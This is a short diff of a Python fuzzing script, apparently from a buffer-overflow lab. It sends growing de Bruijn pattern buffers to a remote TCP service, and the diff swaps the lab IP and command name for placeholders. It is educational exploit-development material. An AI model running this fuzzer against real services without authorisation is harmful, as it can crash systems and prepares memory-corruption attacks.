@@ -2,7 +2,7 @@
 import socket, time, sys
 from pattern import bruijn
 
-RHOST = "10.10.149.116"
+RHOST = "changeme"
 RPORT = 1337
 timeout = 2
 step = 100
@@ -18,7 +18,7 @@ for i in range(0, len(pattern), step):
         connect = s.connect((RHOST, RPORT))
         print("Sending buffer with a size of {0}".format(i))
         s.recv(1024)
-        s.send(b"OVERFLOW3 "+pattern[:i]+b"\r\n")
+        s.send(b"somecommand "+pattern[:i]+b"\r\n")
         s.close()
         time.sleep(1)
     except:
